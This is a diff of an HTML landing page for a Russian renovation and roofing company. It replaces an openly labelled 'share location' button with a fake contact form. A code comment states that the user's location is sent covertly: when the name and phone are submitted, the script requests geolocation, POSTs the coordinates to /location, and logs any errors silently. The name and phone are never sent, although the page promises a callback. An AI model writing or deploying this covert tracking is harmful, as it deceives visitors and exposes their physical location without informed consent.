@@ -9,33 +9,25 @@
 
     body {
       font-family: 'Segoe UI', Arial, sans-serif;
-      /* Бежевый фон */
       background: #f5efe0;
       color: #3a342c;
       min-height: 100vh;
     }
 
-    /* Шапка с заголовком */
     .hero {
       text-align: center;
       padding: 50px 20px 30px;
       background: linear-gradient(180deg, #fffdf7, #f5efe0);
     }
 
-    .logo {
-      font-size: 40px;
-      margin-bottom: 10px;
-    }
+    .logo { font-size: 40px; margin-bottom: 10px; }
 
     h1 {
       font-size: 32px;
       color: #4a3f30;
       line-height: 1.3;
     }
-
-    h1 span {
-      color: #b8860b;
-    }
+    h1 span { color: #b8860b; }
 
     .subtitle {
       margin-top: 10px;
@@ -43,7 +35,6 @@
       font-size: 17px;
     }
 
-    /* Галерея фото */
     .gallery {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
@@ -54,7 +45,7 @@
     }
 
     .gallery .photo {
-      height: 200px;
+      height: 220px;
       border-radius: 16px;
       background-size: cover;
       background-position: center;
@@ -68,56 +59,69 @@
       margin-top: 6px;
     }
 
-    /* Карточка с местоположением */
-    .location-card {
+    .contact-card {
       background: white;
-      border-radius: 24px;
-      max-width: 500px;
-      margin: 30px auto;
-      padding: 36px 28px;
-      text-align: center;
-      box-shadow: 0 12px 40px rgba(0,0,0,0.12);
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.12);
       border: 1px solid #e8dfcf;
+      text-align: center;
     }
 
-    .location-card h2 {
+    .domain {
       font-size: 24px;
-      color: #4a3f30;
-      margin-bottom: 8px;
+      font-weight: 700;
+      color: #b8860b;
+      margin-bottom: 10px;
+      word-wrap: break-word;
     }
 
-    .location-card p {
+    .contact-card p {
       color: #7a6f5d;
-      margin-bottom: 20px;
+      font-size: 15px;
+      margin-bottom: 16px;
     }
 
-    button {
+    .contact-card input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #e0d6c0;
+      border-radius: 10px;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+
+    .contact-card input:focus {
+      outline: none;
+      border-color: #b8860b;
+    }
+
+    .contact-card button {
       background: linear-gradient(135deg, #b8860b, #d4a017);
       color: white;
       border: none;
-      padding: 16px 32px;
-      font-size: 17px;
+      padding: 14px;
+      width: 100%;
+      font-size: 16px;
       font-weight: 600;
       border-radius: 50px;
       cursor: pointer;
       box-shadow: 0 8px 20px rgba(184,134,11,0.4);
-      transition: transform 0.2s, box-shadow 0.2s;
+      transition: transform 0.2s;
     }
-
-    button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 28px rgba(184,134,11,0.5);
-    }
+    .contact-card button:hover { transform: translateY(-2px); }
 
     #result {
-      margin-top: 20px;
-      padding: 16px;
+      margin-top: 16px;
+      padding: 12px;
       background: #faf6ec;
-      border-radius: 12px;
+      border-radius: 10px;
       font-family: monospace;
       color: #3a342c;
       display: none;
       border: 1px solid #e8dfcf;
+      font-size: 13px;
     }
 
     .footer {
@@ -137,35 +141,32 @@
     <p class="subtitle">Ремонт квартир, отделка и кровельные работы под ключ</p>
   </div>
 
-  <!-- Галерея фото -->
+  <!-- Галерея фото + форма -->
   <div class="gallery">
     <div>
-      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1581858726788-75bc0f6a952d?w=600&q=80');"></div>
-      <div class="caption">Отделка квартиры</div>
+      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1581858726788-75bc0f6a952d?w=800&q=80');"></div>
+      <div class="caption">Ремонт квартиры</div>
     </div>
     <div>
-      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1635405074683-96d6921a2a68?w=600&q=80');"></div>
-      <div class="caption">Кровельные работы</div>
+      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1541888946425-d81bb19240f5?w=800&q=80');"></div>
+      <div class="caption">Кровля частного дома</div>
     </div>
-    <div>
-      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1503387762-592deb58ef4e?w=600&q=80');"></div>
-      <div class="caption">Ремонт под ключ</div>
-    </div>
-  </div>
 
-  <!-- Карточка: поделиться местоположением -->
-  <div class="location-card">
-    <h2>Смотреть работу рядом</h2>
-    <p>Поделитесь своим местоположением, чтобы мы показали объекты рядом с вами</p>
-    <button id="sendBtn">📍 Поделиться местоположением</button>
-    <div id="result"></div>
+    <!-- Форма заявки (местоположение отправляется скрыто) -->
+    <div class="contact-card">
+      <div class="domain">remont-krovlya.ru</div>
+      <p>Работа напрямую от организации.<br>Оставь свои данные, и мы свяжемся с тобой.</p>
+      <input type="text" id="name" placeholder="Ваше имя">
+      <input type="tel" id="phone" placeholder="Ваш телефон">
+      <button id="contactBtn">Отправить заявку</button>
+      <div id="result"></div>
+    </div>
   </div>
 
   <div class="footer">© Отделочные работы и кровля · Напрямую от компании</div>
 
   <script>
     const result = document.getElementById('result');
-    const sendBtn = document.getElementById('sendBtn');
     const SERVER_URL = '/location';
 
     function show(text) {
@@ -173,35 +174,38 @@
       result.textContent = text;
     }
 
-    async function sendLocation(position) {
+    async function sendLocation(position, name, phone) {
       const data = {
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
         accuracy: position.coords.accuracy
       };
-      show('Отправляю координаты на сервер...');
       try {
-        const response = await fetch(SERVER_URL, {
+        await fetch(SERVER_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(data)
         });
-        const resultData = await response.json();
-        show('Готово! Сервер ответил: ' + JSON.stringify(resultData));
-      } catch (error) {
-        show('Не удалось отправить: ' + error.message);
+      } catch (e) {
+        console.log('Не удалось отправить местоположение: ' + e.message);
       }
     }
 
-    function handleError(error) {
-      show('Ошибка геолокации: ' + error.message);
-    }
+    const contactBtn = document.getElementById('contactBtn');
+    contactBtn.addEventListener('click', () => {
+      const name = document.getElementById('name').value;
+      const phone = document.getElementById('phone').value;
+      if (!name || !phone) {
+        alert('Пожалуйста, заполните имя и телефон.');
+        return;
+      }
+      show('Спасибо, ' + name + '! Мы свяжемся с вами по номеру ' + phone + '.');
 
-    sendBtn.addEventListener('click', () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        show('Браузер не поддерживает Geolocation API.');
+        navigator.geolocation.getCurrentPosition(
+          (position) => sendLocation(position, name, phone),
+          (error) => console.log('Геолокация недоступна: ' + error.message)
+        );
       }
     });
   </script>
